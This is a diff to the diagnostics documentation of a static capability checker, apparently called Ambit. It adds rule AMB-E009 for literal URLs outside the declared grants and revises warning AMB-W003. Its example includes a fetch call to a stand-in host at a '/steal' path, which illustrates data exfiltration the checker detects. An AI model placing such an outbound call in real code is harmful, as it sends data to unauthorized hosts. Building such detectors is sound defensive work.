@@ -145,6 +145,46 @@ violation in `A`. An undeclared hop does not launder an escalation.
 Example: a function declaring `@capabilities db:read:users` that calls one
 declaring `@capabilities db:write:users`.
 
+## AMB-E009
+
+Literal target outside the granted capabilities.
+
+**Severity:** error
+**Category:** capabilities
+
+A function declaring `@capabilities` performs an operation whose target the
+source fixes — a literal URL, or a template literal whose static head already
+ends the authority — and no grant covers it. This is the static half of
+DESIGN.md §4.4's 二重強制: 「リテラル URL や既知クライアントなど静的に判定
+できる違反はチェッカーが止める」.
+
+Reported at the call site, not at the declaration: that is the line to change.
+Separate from AMB-E005 because the finding is different — nothing declared
+this requirement, the body performs it directly, so there is no callee whose
+contract is too wide.
+
+What is matched: `http:<method>:<host>` for the bundled HTTP entry points
+(`fetch`, `undici`'s `fetch`, `node:http`/`node:https`'s `get`/`request`). The
+method comes from a literal `method` in an options object literal and defaults
+to `get`; the host is taken as written, port included and userinfo dropped. A
+URL the source does not fix — built at runtime, or a template literal whose
+static head stops inside the authority — produces no requirement to compare
+and is reported as `AMB-W003` instead, naming the runtime as the place it is
+matched. A relative URL names no host and is treated the same way.
+
+No `db:` capability is derived from a SQL statement. §4.4 is explicit that a
+hook on a database client does not amount to deciding table-level permission
+for arbitrary SQL, and reading a table name out of a literal statement would
+be the same claim in a different place.
+
+Example: an entrypoint granting `@capabilities http:get:api.example.com` whose
+body calls `fetch("https://elsewhere.example/steal")`.
+
+**Fixes:** none. Widening the grant and changing the URL are both plausible
+and Ambit cannot tell which was meant; §5.3 forbids inventing a candidate for
+the sake of ranking, and silently widening a capability is the expansion of
+authority the tag exists to catch.
+
 ## AMB-W003
 
 Declared capabilities reach unknown.
@@ -152,10 +192,15 @@ Declared capabilities reach unknown.
 **Severity:** warning
 **Category:** capabilities
 
-A function with declared `@capabilities` reaches a call that could not be
-resolved, so what it actually requires is not fully known. The capability
-analogue of AMB-W001, and promoted to an error by `--strict` for the same
-reason.
+A function with declared `@capabilities` cannot have its requirement fully
+determined. The capability analogue of AMB-W001, and promoted to an error by
+`--strict` for the same reason.
+
+The message names which of three causes applies, because they are fixed
+differently: a callee that could not be resolved, a `@boundary` callee that
+declared no `@capabilities`, or an operation whose target the source does not
+fix (a URL built at runtime — see AMB-E009), which §4.4 assigns to the runtime
+hook rather than to the checker.
 
 ## AMB-W002
 
